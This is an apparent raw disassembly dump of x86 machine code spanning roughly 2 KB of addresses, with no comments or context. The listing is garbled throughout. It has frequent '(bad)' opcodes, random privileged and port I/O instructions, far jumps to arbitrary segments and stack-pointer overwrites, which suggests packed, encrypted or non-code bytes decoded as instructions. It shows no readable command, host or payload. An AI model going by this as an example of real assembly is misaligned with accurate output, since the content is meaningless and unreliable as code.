  418540:	lds    eax,FWORD PTR [ebx]
  418542:	cmc    
  418543:	iret   
  418544:	ds inc ebp
  418546:	addr16 mov edi,0xf11802d3
  41854c:	pop    ebx
  41854d:	and    eax,ebx
  41854f:	arpl   WORD PTR ds:0x638e72ef,dx
  418555:	sbb    eax,0xdce489a9
  41855a:	mov    BYTE PTR [eax+0x25a2ebc7],bh
  418560:	popa   
  418561:	add    eax,0x6679f6ff
  418566:	pop    ebp
  418567:	and    al,0x57
  418569:	pop    ecx
  41856a:	mov    ebx,0x75f4987f
  41856f:	clc    
  418570:	mov    BYTE PTR [eax+edi*8],cl
  418573:	clc    
  418574:	stos   BYTE PTR es:[edi],al
  418575:	sbb    esp,DWORD PTR [eax]
  418577:	and    al,cl
  418579:	pop    ebx
  41857a:	xchg   ebx,eax
  41857b:	push   0x4d
  41857d:	push   0xc43f491d
  418582:	add    cl,BYTE PTR [esi+0x60c3785]
  418588:	test   cl,bl
  41858a:	call   0xcc97:0xac6bce30
  418591:	out    0x75,eax
  418593:	icebp  
  418594:	jnp    0x418598
  418596:	(bad)  
  418597:	xchg   esi,eax
  418598:	fwait
  418599:	or     BYTE PTR [esi],bl
  41859b:	sub    esi,edi
  41859d:	loopne 0x4185ff
  41859f:	dec    ebx
  4185a0:	test   eax,0x7bc7a7dc
  4185a5:	jo     0x41858f
  4185a7:	mov    esp,ecx
  4185a9:	xor    bh,BYTE PTR [ecx]
  4185ab:	jno    0x4185a3
  4185ad:	fdiv   st(4),st
  4185af:	lock (bad) 
  4185b1:	cwde   
  4185b2:	inc    esi
  4185b3:	lds    ecx,FWORD PTR [ecx+esi*4]
  4185b6:	adc    al,0x1c
  4185b8:	call   ecx
  4185ba:	mov    esp,0xfa32a450
  4185bf:	mov    bl,0x2a
  4185c1:	and    al,0x15
  4185c3:	neg    DWORD PTR [esp+ebp*8]
  4185c6:	out    0x83,al
  4185c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185c9:	ins    DWORD PTR es:[edi],dx
  4185ca:	adc    eax,0xe39b7868
  4185cf:	jae    0x41856b
  4185d1:	xlat   BYTE PTR ds:[ebx]
  4185d2:	mov    esi,0xc14f55e
  4185d7:	les    ecx,FWORD PTR [ecx-0x18c836b9]
  4185dd:	mov    ecx,0x632a9d7f
  4185e2:	inc    esp
  4185e3:	imul   BYTE PTR ds:0x1be62a0b
  4185e9:	retf   0x3fe8
  4185ec:	pop    esi
  4185ed:	pop    edx
  4185ee:	mov    cl,0xf4
  4185f0:	(bad)  
  4185f1:	out    0x7e,eax
  4185f3:	or     eax,0x94f60f42
  4185f8:	(bad)  
  4185f9:	xor    BYTE PTR [ebp+0xc],0x31
  4185fd:	movlhps xmm3,xmm5
  418600:	mov    cl,BYTE PTR [ebx]
  418602:	jae    0x418592
  418604:	adc    eax,0x99482944
  418609:	or     BYTE PTR [ecx+eax*8],bl
  41860c:	popa   
  41860d:	outs   dx,BYTE PTR ds:[esi]
  41860e:	adc    DWORD PTR [ebp-0x5c],ebp
  418611:	out    0xea,al
  418613:	pop    eax
  418614:	push   ebx
  418615:	inc    edi
  418616:	push   ds
  418617:	cmp    ah,al
  418619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41861a:	imul   edx,DWORD PTR ds:0xef3053b2,0x6a
  418621:	stos   BYTE PTR es:[edi],al
  418622:	test   al,0xa1
  418624:	mov    bl,0x5d
  418626:	cmp    al,0xa8
  418628:	and    DWORD PTR [edi-0x5b36db19],eax
  41862e:	jle    0x4185fa
  418630:	adc    eax,0xb18127be
  418635:	in     al,0x5d
  418637:	inc    ebp
  418638:	not    BYTE PTR [esi]
  41863a:	jb     0x4186b9
  41863c:	iret   
  41863d:	adc    dl,dh
  41863f:	mov    dh,0xc5
  418641:	pop    edi
  418642:	sub    ah,ch
  418644:	out    dx,al
  418645:	dec    ebp
  418646:	mov    al,BYTE PTR cs:[ebp+0x10854a15]
  41864d:	aaa    
  41864e:	sbb    DWORD PTR [esi+ebp*8+0x47],esp
  418652:	(bad)  
  418653:	mov    esp,0x19c6fe11
  418658:	jecxz  0x4186c7
  41865a:	loope  0x41861e
  41865c:	mov    esi,esi
  41865e:	mov    ds,esp
  418660:	pop    eax
  418661:	arpl   bx,ax
  418663:	adc    al,0xd4
  418665:	inc    esp
  418666:	jb     0x418668
  418668:	and    eax,DWORD PTR [ecx+0x557d94fc]
  41866e:	jecxz  0x418606
  418670:	adc    BYTE PTR [ebx+0x5f],bl
  418673:	sbb    al,0xe9
  418675:	daa    
  418676:	jnp    0x418629
  418678:	lahf   
  418679:	mov    eax,ds:0x176811c5
  41867e:	int    0x19
  418680:	js     0x418648
  418682:	fdivr  DWORD PTR [ebp+ebx*2-0x445cedb6]
  418689:	arpl   WORD PTR [ecx+eiz*1-0x7cd87c70],bx
  418690:	dec    BYTE PTR [ebp+eiz*2-0x3f7f4ed1]
  418697:	aas    
  418698:	popf   
  418699:	pop    ds
  41869a:	jae    0x4186d7
  41869c:	mov    dh,0xd4
  41869e:	or     al,BYTE PTR ds:0x4d9bd466
  4186a4:	pop    ebx
  4186a5:	out    0x11,eax
  4186a7:	outs   dx,BYTE PTR ds:[esi]
  4186a8:	test   DWORD PTR [edi],ebp
  4186aa:	add    bl,BYTE PTR [edx+0x61bd2614]
  4186b0:	(bad)  
  4186b1:	fwait
  4186b2:	add    BYTE PTR [ebx-0x1d],0x90
  4186b6:	adc    DWORD PTR [eax-0x6db4e61a],ebx
  4186bc:	xchg   ecx,eax
  4186bd:	arpl   WORD PTR [edx+0x2c],dx
  4186c0:	pop    esp
  4186c1:	push   cs
  4186c2:	sub    al,0x74
  4186c4:	in     eax,0xb4
  4186c6:	xor    bl,BYTE PTR ss:[ebx-0x7b]
  4186ca:	or     esi,DWORD PTR [edx-0x1814eec]
  4186d0:	inc    edx
  4186d1:	dec    ecx
  4186d2:	popa   
  4186d3:	and    DWORD PTR [ecx],edx
  4186d5:	in     eax,0xa0
  4186d7:	mov    ebp,0x26c5248b
  4186dc:	popf   
  4186dd:	mov    al,ds:0x985ae23f
  4186e2:	mov    DWORD PTR [ebx-0x676e8702],esi
  4186e8:	lds    edi,FWORD PTR [edi+0x72]
  4186eb:	aam    0xab
  4186ed:	ret    0xf7a4
  4186f0:	mov    dl,0xd6
  4186f2:	xchg   DWORD PTR [esi+0x99055a],eax
  4186f8:	add    eax,0xb87953ef
  4186fd:	cmp    eax,0x14f3ca50
  418702:	and    dl,BYTE PTR [edx-0x77]
  418705:	popa   
  418706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418707:	enter  0xd727,0xee
  41870b:	push   ebx
  41870c:	ja     0x4186e8
  41870e:	jb     0x41877e
  418710:	daa    
  418711:	and    BYTE PTR [ebp-0x16],bl
  418714:	sub    eax,0x464b55
  418719:	les    ebx,FWORD PTR [esp]
  41871c:	shl    BYTE PTR [edx],0xb5
  41871f:	or     BYTE PTR [eax+0x2f60d80],dl
  418725:	or     ah,BYTE PTR [eax]
  418727:	pop    ecx
  418728:	cli    
  418729:	add    ah,BYTE PTR [ebp-0x55]
  41872c:	pop    ebx
  41872d:	and    ah,al
  41872f:	das    
  418730:	mov    DWORD PTR [ebp-0x27],edi
  418733:	mov    esp,DWORD PTR [edx+eax*8-0xbea0b17]
  41873a:	ret    0x3cc7
  41873d:	mov    bh,0xf
  41873f:	call   0x57f9bf56
  418744:	or     al,0xa2
  418746:	test   BYTE PTR [edi+0x38d73fb5],al
  41874c:	sbb    dl,BYTE PTR [edx]
  41874e:	push   0xffffffa5
  418750:	cld    
  418751:	or     al,0x22
  418753:	push   ss
  418754:	fbstp  TBYTE PTR ds:0x58b27f7f
  41875b:	xor    BYTE PTR [eax-0x2448f591],ah
  418761:	das    
  418762:	ja     0x4186ee
  418764:	out    0x67,al
  418766:	sbb    DWORD PTR [eax+ebp*8+0x5d5e5ac1],esp
  41876d:	les    edx,FWORD PTR [ecx]
  41876f:	cdq    
  418770:	mov    edx,0x6b1cefe2
  418775:	cmp    eax,0xc8616d6c
  41877a:	and    eax,0x91c7a783
  41877f:	mov    al,0xf1
  418781:	mov    BYTE PTR [edx],cl
  418783:	icebp  
  418784:	jecxz  0x4187f4
  418786:	mov    bl,0x96
  418788:	(bad)  
  418789:	aaa    
  41878a:	or     edx,eax
  41878c:	xor    DWORD PTR [eax-0x43],esp
  41878f:	lock adc BYTE PTR [ebx],dl
  418792:	fwait
  418793:	into   
  418794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418795:	(bad)  
  418796:	rcl    DWORD PTR [ebx+0x56],cl
  418799:	(bad)  
  41879b:	inc    ecx
  41879c:	pop    ss
  41879d:	js     0x4187bc
  41879f:	std    
  4187a0:	in     al,0x2a
  4187a2:	mov    ecx,0x5c0adc28
  4187a7:	icebp  
  4187a8:	mov    edx,0xb76ea2cf
  4187ad:	mov    ebp,0xb7ec8ea8
  4187b2:	inc    esi
  4187b3:	cli    
  4187b4:	sub    al,bl
  4187b6:	pop    ebx
  4187b7:	pop    ds
  4187b8:	or     BYTE PTR [edi+0x5770e1ea],ch
  4187be:	push   ebx
  4187bf:	pop    esi
  4187c0:	jb     0x41879f
  4187c2:	pusha  
  4187c3:	xor    bh,BYTE PTR cs:[esp+edi*8]
  4187c7:	push   0x28
  4187c9:	in     al,0x58
  4187cb:	add    BYTE PTR [ebp-0x1b],dh
  4187ce:	jmp    0x60b5e063
  4187d3:	xor    ebx,DWORD PTR [ecx-0x55aa2bdf]
  4187d9:	adc    bh,BYTE PTR [edx-0x74ea428f]
  4187df:	sub    BYTE PTR [eax],0xbf
  4187e2:	sub    al,BYTE PTR [edi+0x33]
  4187e5:	dec    esp
  4187e6:	scas   eax,DWORD PTR es:[edi]
  4187e7:	popf   
  4187e8:	pop    DWORD PTR [ebp+0x68]
  4187eb:	dec    edx
  4187ec:	call   0xc0ed:0xa28350fe
  4187f3:	mov    ?,WORD PTR [ecx]
  4187f5:	pop    ecx
  4187f6:	and    al,0xb
  4187f8:	loope  0x418856
  4187fa:	out    0xed,eax
  4187fc:	shr    BYTE PTR [eax+0x588e0a12],cl
  418802:	push   es
  418803:	dec    ecx
  418804:	sub    eax,0x61d9978
  418809:	or     eax,0x9daeb0af
  41880e:	sbb    bh,BYTE PTR [edi]
  418810:	shl    DWORD PTR [esi-0x24d3fc55],1
  418816:	cdq    
  418817:	repnz enter 0x4a23,0x35
  41881c:	inc    edx
  41881d:	inc    esp
  41881e:	add    DWORD PTR [eax],ecx
  418820:	push   0x1fdbf6b1
  418825:	or     al,0x3c
  418827:	sbb    BYTE PTR [edi+ebx*2-0x22f74c69],ch
  41882e:	je     0x418805
  418830:	add    ch,BYTE PTR [ecx+0x4b]
  418833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418834:	out    0x36,eax
  418836:	ror    dh,cl
  418838:	and    BYTE PTR [ebp-0x741640c8],ah
  41883e:	ins    DWORD PTR es:[edi],dx
  41883f:	or     DWORD PTR [esp+ecx*1+0x2e],ecx
  418843:	pushf  
  418844:	shl    DWORD PTR [edi],1
  418846:	fiadd  DWORD PTR [ecx+0x18]
  418849:	cmp    DWORD PTR [eax+0x5cb7df0f],eax
  41884f:	test   BYTE PTR [eax-0xf],dl
  418852:	jbe    0x41881d
  418854:	mov    bh,0xee
  418856:	nop
  418857:	xchg   ecx,eax
  418858:	pop    es
  418859:	pop    esp
  41885a:	jmp    0x5795:0xd0f76f77
  418861:	jp     0x4188d6
  418863:	sbb    al,0x25
  418865:	test   al,0xd6
  418867:	pop    ds
  418868:	(bad)  
  418869:	fidivr WORD PTR [ecx*4-0x1c462e21]
  418870:	push   ebx
  418871:	nop
  418872:	cmp    ch,ch
  418874:	sub    al,0x1f
  418876:	in     al,0x3e
  418878:	data16 xor al,0x42
  41887b:	inc    ebp
  41887c:	lods   eax,DWORD PTR ds:[esi]
  41887d:	push   esp
  41887e:	mov    cl,0x50
  418880:	out    0xf5,al
  418882:	addr16 jg 0x4188d3
  418885:	jbe    0x418890
  418887:	imul   esi,DWORD PTR [ebx+0xce8f9c6],0x994a6b
  418891:	cmp    BYTE PTR [esi-0x1b],dl
  418894:	or     bl,BYTE PTR [ebp+ebx*1-0x670a777]
  41889b:	xor    BYTE PTR [eax],bh
  41889d:	ins    BYTE PTR es:[edi],dx
  41889e:	shr    ebp,0xc4
  4188a1:	cld    
  4188a2:	shr    ecx,cl
  4188a4:	push   ebp
  4188a5:	mov    BYTE PTR [ebx-0x1e887b08],cl
  4188ab:	pop    ecx
  4188ac:	jmp    0xd7ec:0x79788afa
  4188b3:	out    0x6f,eax
  4188b5:	adc    ebx,DWORD PTR [ebp-0x45]
  4188b8:	stc    
  4188b9:	out    dx,al
  4188ba:	sub    al,0x60
  4188bc:	push   edx
  4188bd:	lea    edx,[edi]
  4188bf:	jg     0x4188e8
  4188c1:	mov    esp,0x348303e0
  4188c6:	jns    0x4188a7
  4188c8:	push   es
  4188c9:	fdiv   DWORD PTR [eax+0x3d4e7a79]
  4188cf:	dec    esp
  4188d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188d1:	sub    eax,esi
  4188d3:	(bad)  
  4188d6:	cwde   
  4188d7:	or     edx,DWORD PTR [eax]
  4188d9:	int3   
  4188da:	pop    edi
  4188db:	test   BYTE PTR [esi-0x4d6e05a1],bh
  4188e1:	jmp    0xc3bc0bfb
  4188e6:	in     eax,0x93
  4188e8:	dec    edx
  4188e9:	js     0x418871
  4188eb:	(bad)  
  4188ec:	imul   eax,ebp,0x942d3c28
  4188f2:	pushf  
  4188f3:	sbb    eax,0x20179ce8
  4188f8:	inc    ebx
  4188f9:	push   ebx
  4188fa:	outs   dx,BYTE PTR ds:[esi]
  4188fb:	xor    DWORD PTR [ecx-0x6d19da63],ecx
  418901:	pop    esp
  418902:	in     eax,0x53
  418904:	add    bl,BYTE PTR [edi-0x5c]
  418907:	jns    0x418933
  418909:	add    bl,BYTE PTR [esi]
  41890b:	mov    ds:0x64e13daa,al
  418910:	stos   DWORD PTR es:[edi],eax
  418911:	lahf   
  418912:	xlat   BYTE PTR ds:[ebx]
  418913:	sbb    esp,edi
  418915:	and    al,0x3a
  418917:	(bad)  
  418918:	and    al,0x2d
  41891a:	ja     0x4188e1
  41891c:	je     0x418997
  41891e:	(bad)  
  418920:	mov    al,0x6d
  418922:	dec    ebp
  418923:	fdivr  DWORD PTR [esi+0x3]
  418926:	dec    edx
  418927:	enter  0x126a,0x9d
  41892b:	adc    edi,DWORD PTR [eax+0x40]
  41892e:	outs   dx,BYTE PTR ds:[esi]
  41892f:	into   
  418930:	in     al,0xc2
  418932:	cs jg  0x41895a
  418935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418936:	retf   0x23d7
  418939:	fnstenv [esi-0x39]
  41893c:	xor    DWORD PTR [ebx],esi
  41893e:	inc    edi
  41893f:	xor    al,0x6f
  418941:	sub    dl,BYTE PTR [eax]
  418943:	ds retf 0xd856
  418947:	sub    ah,BYTE PTR [edx]
  418949:	pop    esi
  41894a:	mov    eax,ds:0x41b86bf9
  41894f:	dec    edx
  418950:	pop    ds
  418951:	stos   DWORD PTR es:[edi],eax
  418952:	pop    esi
  418953:	jge    0x41894b
  418955:	loop   0x418942
  418957:	xchg   BYTE PTR [ebp-0x26],bl
  41895a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41895b:	ret    
  41895c:	mov    bl,0xcb
  41895e:	xchg   edi,eax
  41895f:	pop    edx
  418960:	stos   DWORD PTR es:[edi],eax
  418961:	and    dh,dh
  418963:	ins    BYTE PTR es:[edi],dx
  418964:	(bad)  
  418965:	or     dh,BYTE PTR [edi+eax*1]
  418968:	jge    0x4189a7
  41896a:	dec    eax
  41896b:	fldenv [edi-0x1ea37bc0]
  418971:	xor    eax,0x606f7af4
  418976:	out    dx,al
  418977:	sbb    al,0xc3
  418979:	jecxz  0x418910
  41897b:	pop    eax
  41897c:	jae    0x4189b9
  41897e:	add    ah,BYTE PTR [edi+0x6b]
  418981:	jo     0x4189e7
  418983:	ds enter 0xa28c,0x87
  418988:	fbld   TBYTE PTR es:[edx+0x5b]
  41898c:	dec    eax
  41898d:	icebp  
  41898e:	adc    eax,0x3945c50e
  418993:	or     DWORD PTR [ebx-0x78],0xffffffb5
  418997:	outs   dx,BYTE PTR ds:[esi]
  418998:	sub    al,0x39
  41899a:	mov    ds:0x2d884f8f,eax
  41899f:	adc    DWORD PTR ds:0x28b7135e,0x2f59848d
  4189a9:	push   edx
  4189aa:	mov    ebp,0xf1da9f5b
  4189af:	shl    BYTE PTR [edi],0xbc
  4189b2:	daa    
  4189b3:	out    dx,al
  4189b4:	lods   eax,DWORD PTR ds:[esi]
  4189b5:	fist   DWORD PTR [eax]
  4189b7:	outs   dx,BYTE PTR ds:[esi]
  4189b8:	sub    al,0x7
  4189ba:	xchg   ebp,eax
  4189bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189bc:	scas   al,BYTE PTR es:[edi]
  4189bd:	pop    esp
  4189be:	in     eax,dx
  4189bf:	loopne 0x4189ca
  4189c1:	mov    eax,0xa699b3aa
  4189c6:	sbb    ecx,eax
  4189c8:	bound  ecx,QWORD PTR [ebp+0x7a]
  4189cb:	mov    eax,edx
  4189cd:	cmp    eax,0xfbee16d1
  4189d2:	out    dx,eax
  4189d3:	adc    BYTE PTR [edi+0x4940e52b],0x65
  4189da:	and    al,0x15
  4189dc:	arpl   sp,di
  4189de:	mov    ds:0xb0bcecb6,al
  4189e3:	aam    0x3b
  4189e5:	lods   al,BYTE PTR ds:[esi]
  4189e6:	int3   
  4189e7:	mov    cl,0xe
  4189e9:	rdpmc  
  4189eb:	fdivr  st(0),st
  4189ed:	or     eax,0xfc5361ab
  4189f2:	(bad)  
  4189f3:	cmp    BYTE PTR [edx-0x29],al
  4189f6:	mov    DWORD PTR [ebx],esp
  4189f8:	ret    
  4189f9:	or     BYTE PTR [ebp-0x3adcdae3],ch
  4189ff:	push   esp
  418a00:	dec    ebx
  418a01:	push   ebx
  418a02:	inc    ebx
  418a03:	cmp    ch,BYTE PTR [ebx]
  418a05:	jno    0x4189a7
  418a07:	hlt    
  418a08:	dec    ebx
  418a09:	outs   dx,DWORD PTR ds:[esi]
  418a0a:	mov    ah,0xe6
  418a0c:	push   esp
  418a0d:	xor    BYTE PTR [esi+edx*2+0x5c],0xee
  418a12:	stos   BYTE PTR es:[edi],al
  418a13:	imul   eax
  418a15:	xor    eax,DWORD PTR [ebx-0x4257b688]
  418a1b:	pop    ds
  418a1c:	hlt    
  418a1d:	mov    al,BYTE PTR [edx+0xb]
  418a20:	xchg   edi,eax
  418a21:	clc    
  418a22:	sub    bl,BYTE PTR fs:[esi-0x38e8cf4d]
  418a29:	out    dx,al
  418a2a:	sbb    DWORD PTR ds:0x229a926,0xfec1faf5
  418a34:	les    eax,FWORD PTR [ebp-0x356d028b]
  418a3a:	mov    dl,0x2
  418a3c:	out    dx,al
  418a3d:	mov    esp,0x6058866d
  418a42:	mul    DWORD PTR [ecx+ebx*1]
  418a45:	aaa    
  418a46:	xchg   ebx,eax
  418a47:	adc    BYTE PTR [edx+0x7f],ch
  418a4a:	ss pop ss
  418a4c:	es or  esi,eax
  418a4f:	jecxz  0x418a98
  418a51:	add    eax,0x726ca533
  418a56:	dec    ecx
  418a57:	lods   al,BYTE PTR ds:[esi]
  418a58:	aas    
  418a59:	push   edi
  418a5a:	pop    ss
  418a5b:	mov    dh,0xfc
  418a5d:	fucomip st,st(7)
  418a5f:	les    esi,FWORD PTR [edx+0x52021357]
  418a65:	std    
  418a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a67:	ins    DWORD PTR es:[edi],dx
  418a68:	inc    ecx
  418a69:	and    BYTE PTR [ebp+ecx*8-0x673f3fdb],0x1e
  418a71:	out    0x7e,eax
  418a73:	push   ss
  418a74:	push   esp
  418a75:	push   es
  418a76:	mov    esi,0x23189e90
  418a7b:	pop    eax
  418a7c:	mov    dl,0xa
  418a7e:	stc    
  418a7f:	mov    edi,0x415ac2e2
  418a84:	xchg   edi,eax
  418a85:	shr    BYTE PTR [ebp+0x2d82d238],cl
  418a8b:	pop    ebp
  418a8c:	sbb    al,0x42
  418a8e:	mov    al,0x99
  418a90:	mov    ds:0xda0c0dbd,eax
  418a95:	pop    eax
  418a96:	dec    edx
  418a97:	fmul   DWORD PTR [ecx]
  418a99:	stc    
  418a9a:	je     0x418a42
  418a9c:	nop
  418a9d:	loop   0x418a8a
  418a9f:	dec    ebp
  418aa0:	xchg   ebx,eax
  418aa1:	jo     0x418a68
  418aa3:	popa   
  418aa4:	push   0x5b
  418aa6:	pop    ecx
  418aa7:	add    DWORD PTR [ecx+0x20d75637],0x3a462433
  418ab1:	pushf  
  418ab2:	jmp    0xddca50e1
  418ab7:	test   al,0xca
  418ab9:	xchg   BYTE PTR [eax],bh
  418abb:	mov    WORD PTR [esi+0x2b],?
  418abe:	iret   
  418abf:	jbe    0x418b0b
  418ac1:	push   es
  418ac2:	xchg   DWORD PTR [edi+eiz*8-0x6a4b443f],esp
  418ac9:	xchg   BYTE PTR [edi-0xe0d69d4],al
  418acf:	shl    DWORD PTR [esi+0x46],0x8f
  418ad3:	popa   
  418ad4:	add    DWORD PTR [ebp-0x40],0x33
  418ad8:	in     al,0x2a
  418ada:	mov    ebp,0xdf24f2d6
  418adf:	into   
  418ae0:	shr    DWORD PTR [ecx+0x1b],1
  418ae3:	fs cdq 
  418ae5:	xchg   ebp,eax
  418ae6:	sbb    DWORD PTR [edi-0x55],edi
  418ae9:	pop    ebp
  418aea:	mov    cl,0x35
  418aec:	pop    eax
  418aed:	ss dec eax
  418aef:	scas   al,BYTE PTR es:[edi]
  418af0:	xchg   DWORD PTR [ecx-0x6f23f73c],edi
  418af6:	sbb    eax,0x632a5d0c
  418afb:	and    BYTE PTR [ecx+0xb],0xfc
  418aff:	loopne 0x418ad3
  418b01:	xor    ecx,esi
  418b03:	retf   0x6e4a
  418b06:	mov    ch,0x51
  418b08:	xchg   edi,eax
  418b09:	cs push es
  418b0b:	inc    sp
  418b0d:	ds sti 
  418b0f:	and    eax,0xd010acc8
  418b14:	imul   esp,DWORD PTR [ebx-0x32234b69],0xb8e46125
  418b1e:	jae    0x418ae5
  418b20:	mov    al,0xe6
  418b22:	xor    al,BYTE PTR [edx+0x38]
  418b25:	(bad)  
  418b27:	or     eax,0xfde3a056
  418b2c:	mov    edi,0x788a65fc
  418b31:	jl     0x418abd
  418b33:	jmp    DWORD PTR [ebx-0x37]
  418b36:	adc    edi,DWORD PTR [ebp-0x3a]
  418b39:	add    eax,0x62e5dd49
  418b3e:	xor    bl,BYTE PTR [ecx+ecx*8+0x52]
  418b42:	xchg   edi,eax
  418b43:	jg     0x418ae6
  418b45:	cmp    al,0x6b
  418b47:	dec    esi
  418b48:	outs   dx,BYTE PTR ds:[esi]
  418b49:	sbb    BYTE PTR [ebp+0x4150c494],bh
  418b4f:	enter  0xf59,0xf9
  418b53:	adc    cl,BYTE PTR [ecx+0x1678d8d2]
  418b59:	enter  0xecb5,0xe9
  418b5d:	cmp    eax,0x68d048ea
  418b62:	xchg   bl,dh
  418b64:	cmp    BYTE PTR [ecx],cl
  418b66:	pop    ss
  418b67:	lea    edi,[esi+ebp*8-0x1]
  418b6b:	push   ds
  418b6c:	rcr    BYTE PTR [ecx+0x12],cl
  418b6f:	mov    gs,ebp
  418b71:	jmp    0x418ba4
  418b73:	jp     0x418bdd
  418b75:	data16 jne 0x418b11
  418b78:	jp     0x418b2f
  418b7a:	test   BYTE PTR [ebp+0x59c63d1c],bh
  418b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b81:	sbb    al,0x8f
  418b83:	into   
  418b84:	xor    esi,DWORD PTR [ecx+0x4cea7c89]
  418b8a:	xor    edx,DWORD PTR [ecx+0x71]
  418b8d:	xchg   esp,eax
  418b8e:	dec    esp
  418b8f:	push   es
  418b90:	lods   al,BYTE PTR ds:[esi]
  418b91:	popa   
  418b92:	or     edx,DWORD PTR [edi]
  418b94:	cwde   
  418b95:	xchg   esi,eax
  418b96:	or     edx,DWORD PTR [ebx-0x47d4d65c]
  418b9c:	aam    0x2
  418b9e:	add    al,0x94
  418ba0:	ror    DWORD PTR [esi],1
  418ba2:	push   0x6
  418ba4:	ret    
  418ba5:	jns    0x418c10
  418ba7:	jmp    0xd3ab2b4e
  418bac:	mov    dh,0x30
  418bae:	mov    BYTE PTR [ecx+0x6f7ea0b4],0x12
  418bb5:	or     al,0x31
  418bb7:	inc    ebp
  418bb8:	rcl    BYTE PTR [edx+0x5e],cl
  418bbb:	mov    WORD PTR [ebx],ds
  418bbd:	add    al,0x5f
  418bbf:	sub    dl,BYTE PTR [ecx+0x497b2838]
  418bc5:	enter  0x7d02,0xe
  418bc9:	addr16 pusha 
  418bcb:	mov    BYTE PTR [edx+0x79],cl
  418bce:	adc    ch,dl
  418bd0:	(bad)  
  418bd1:	cdq    
  418bd2:	dec    esp
  418bd3:	jmp    0x7d09:0x5509776a
  418bda:	ja     0x418b8c
  418bdc:	jmp    0x418b95
  418bde:	ds adc ebp,ebx
  418be1:	mov    ds:0x37f16288,al
  418be6:	mov    dh,BYTE PTR ds:0xa282e317
  418bec:	faddp  st(0),st
  418bee:	getsec 
  418bf0:	jge    0x418b73
  418bf2:	fcom   st(2)
  418bf4:	mov    ds:0xc157d04d,eax
  418bf9:	out    0x64,al
  418bfb:	cmc    
  418bfc:	ret    0x3a3b
  418bff:	dec    edx
  418c00:	jp     0x418c00
  418c02:	jecxz  0x418bf0
  418c04:	repz xor dh,BYTE PTR [eax+0x6b]
  418c08:	shl    BYTE PTR [esp+eax*1+0x14dad5a4],0x8c
  418c10:	xchg   DWORD PTR [esp+eax*1-0x575363ac],ebp
  418c17:	stos   BYTE PTR es:[edi],al
  418c18:	add    esi,ecx
  418c1a:	or     BYTE PTR [edx-0x35],ah
  418c1d:	dec    ecx
  418c1e:	leave  
  418c1f:	jmp    0x5183:0xe157586c
  418c26:	lods   al,BYTE PTR ds:[esi]
  418c27:	inc    ecx
  418c28:	and    dh,dh
  418c2a:	push   0xffffff9c
  418c2c:	dec    edi
  418c2d:	leave  
  418c2e:	pop    esi
  418c2f:	push   edx
  418c30:	lock xchg BYTE PTR [ecx],ah
  418c33:	sub    ebx,ebp
  418c35:	push   ebp
  418c36:	or     eax,0xfdb86449
  418c3b:	mov    dh,al
  418c3d:	(bad)  [edx-0x7]
  418c40:	ss aas 
  418c42:	retf   0xb060
  418c45:	sub    esp,ebx
  418c47:	sbb    BYTE PTR [esi+0x3b],ah
  418c4a:	stos   BYTE PTR es:[edi],al
  418c4b:	jge    0x418bcd
  418c4d:	stos   BYTE PTR es:[edi],al
  418c4e:	shl    BYTE PTR [esi+0xc0c3f70],1
  418c54:	mov    al,0xb4
  418c56:	int3   
  418c57:	mov    BYTE PTR [edx],bh
  418c59:	mov    esi,edx
  418c5b:	fisubr WORD PTR [ebx+0x52]
  418c5e:	test   eax,0xb364b6c0
  418c63:	leave  
  418c64:	add    BYTE PTR [eax],ch
  418c66:	and    DWORD PTR [eax-0x55146cd1],0xfaaaa560
  418c70:	pusha  
  418c71:	aas    
  418c72:	mul    DWORD PTR [edi+0x4068bc03]
  418c78:	pop    ebp
  418c79:	bound  ebx,QWORD PTR [ebx+edx*2]
  418c7c:	cmp    ch,BYTE PTR [edx-0x7cd9709b]
  418c82:	ret    
  418c83:	inc    esi
  418c84:	cmp    al,BYTE PTR [ecx-0x5e]
  418c87:	fs mov dl,0x9c
  418c8a:	mov    eax,ds:0xbf95fd76
  418c8f:	push   edi
  418c90:	inc    esi
  418c91:	aad    0xbb
  418c93:	std    
  418c94:	push   esp
  418c95:	mov    dl,0x2f
  418c97:	ins    BYTE PTR es:[edi],dx
  418c98:	stc    
  418c99:	fidivr WORD PTR [ecx+esi*4+0x10db22b1]
  418ca0:	aam    0xc8
  418ca2:	fs gs xchg edx,eax
  418ca5:	sub    al,0x5d
  418ca7:	pop    esp
  418ca8:	sub    eax,0xb967bc6b
  418cad:	sahf   
  418cae:	sbb    bh,bl
  418cb0:	mov    bl,0xd3
  418cb2:	icebp  
  418cb3:	pusha  
  418cb4:	xchg   ebp,eax
  418cb5:	push   esi
  418cb6:	ds ja  0x418cdc
  418cb9:	adc    ecx,DWORD PTR [ecx-0x39999f80]
  418cbf:	pop    ecx
  418cc0:	sub    esp,edi
  418cc2:	sti    
  418cc3:	scas   eax,DWORD PTR es:[edi]
  418cc4:	pop    edi
  418cc5:	mov    WORD PTR [edx-0x348ccdfd],ds
  418ccb:	cmp    dl,BYTE PTR [ebx-0x1d]
  418cce:	test   eax,0xe0b14bd9
  418cd3:	rcr    bl,0x9e
  418cd6:	add    BYTE PTR ds:0x2132ea41,0xd4
  418cdd:	jb     0x418c9c
  418cdf:	add    eax,0x8d560494
  418ce4:	lahf   
  418ce5:	push   edi
  418ce6:	adc    BYTE PTR [esi+0x53b331d],ah
  418cec:	and    dl,BYTE PTR [ebp+0x75fe57b1]
  418cf2:	push   eax
  418cf3:	clc    
  418cf4:	retf   0x55b8
  418cf7:	push   edi
  418cf8:	jmp    0x6a16:0x76b946e6
  418cff:	pushf  
  418d00:	bound  ebp,QWORD PTR [ebx]
  418d02:	iret   
  418d03:	cmp    edi,ecx
  418d05:	dec    edi
  418d06:	dec    edi
  418d07:	cwde   
  418d08:	adc    al,0x8f
  418d0a:	aas    
  418d0b:	mov    ebx,0xd33d1585
  418d10:	mov    ds:0x7263b783,al
  418d15:	loope  0x418d8f
  418d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
